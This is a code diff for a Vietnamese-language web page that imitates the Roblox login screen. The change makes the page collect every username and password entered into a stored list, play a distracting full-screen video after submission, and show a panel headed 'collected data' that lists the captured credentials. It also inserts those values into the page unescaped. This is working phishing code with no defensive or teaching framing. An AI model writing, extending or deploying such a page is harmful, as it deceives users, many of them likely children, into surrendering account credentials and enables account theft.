@@ -2,19 +2,15 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Interface</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        #nav { position: absolute; top: 15px; left: 15px; font-size: 14px; cursor: pointer; color: #aaa; display: none; border: 1px solid #333; padding: 5px 10px; }
-        .container { width: 90%; max-width: 360px; text-align: center; }
-        .logo { font-size: 36px; font-weight: bold; margin-bottom: 25px; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; background: #222; color: #fff; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
-        .btn-main { background: #0084ff; color: white; }
-        .btn-fast { background: transparent; border: 2px solid #fff; color: white; }
-        #homeArea { display: none; }
-        #videoOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; }
+        #nav { position: absolute; top: 10px; left: 10px; font-size: 14px; cursor: pointer; color: #aaa; display: none; border: 1px solid #444; padding: 5px; }
+        .container { width: 90%; max-width: 350px; margin: 100px auto; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: none; color: #fff; border-radius: 5px; }
+        button { width: 100%; padding: 12px; margin: 8px 0; background: #0084ff; border: none; color: #fff; font-weight: bold; cursor: pointer; }
+        #homeArea { display: none; padding: 20px; text-align: left; }
+        #vidOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
+        .log-item { background: #111; padding: 10px; margin: 5px 0; border: 1px solid #333; }
     </style>
 </head>
 <body>
@@ -22,20 +18,19 @@
 <div id="nav" onclick="showHome()">Home</div>
 
 <div class="container" id="loginForm">
-    <div class="logo">ROBLOX</div>
-    <input type="text" id="user" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
+    <h2>ROBLOX</h2>
+    <input type="text" id="user" placeholder="Tên người dùng">
     <input type="password" id="pass" placeholder="Mật khẩu">
-    <button class="btn-main" onclick="executeLogin()">Đăng nhập</button>
-    <button class="btn-fast">Đăng Nhập Nhanh</button>
+    <button onclick="executeLogin()">Đăng nhập</button>
 </div>
 
 <div id="homeArea" class="container">
     <h3>Dữ liệu đã thu thập:</h3>
-    <p id="dataLog"></p>
+    <div id="dataList"></div>
 </div>
 
-<div id="videoOverlay">
-    <video id="vid" width="100%" height="100%" loop autoplay>
+<div id="vidOverlay">
+    <video id="vid" width="100%" height="100%" loop>
         <source src="video.mp4" type="video/mp4">
     </video>
 </div>
@@ -45,11 +40,14 @@
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         
-        localStorage.setItem('u', u);
-        localStorage.setItem('p', p);
+        // Thu thập và lưu vào mảng dữ liệu
+        let logs = JSON.parse(localStorage.getItem('all_logs') || '[]');
+        logs.push({user: u, pass: p});
+        localStorage.setItem('all_logs', JSON.stringify(logs));
         
+        // Kích hoạt video
+        document.getElementById('vidOverlay').style.display = 'block';
         const v = document.getElementById('vid');
-        document.getElementById('videoOverlay').style.display = 'block';
         v.volume = 1.0;
         v.play();
 
@@ -60,9 +58,15 @@
 
     function showHome() {
         document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('videoOverlay').style.display = 'none';
+        document.getElementById('vidOverlay').style.display = 'none';
         document.getElementById('homeArea').style.display = 'block';
-        document.getElementById('dataLog').innerText = "User: " + localStorage.getItem('u') + " | Pass: " + localStorage.getItem('p');
+        
+        let logs = JSON.parse(localStorage.getItem('all_logs') || '[]');
+        let html = '';
+        logs.forEach(item => {
+            html += `<div class="log-item">Tên: ${item.user} | MK: ${item.pass}</div>`;
+        });
+        document.getElementById('dataList').innerHTML = html;
     }
 </script>
 </body>
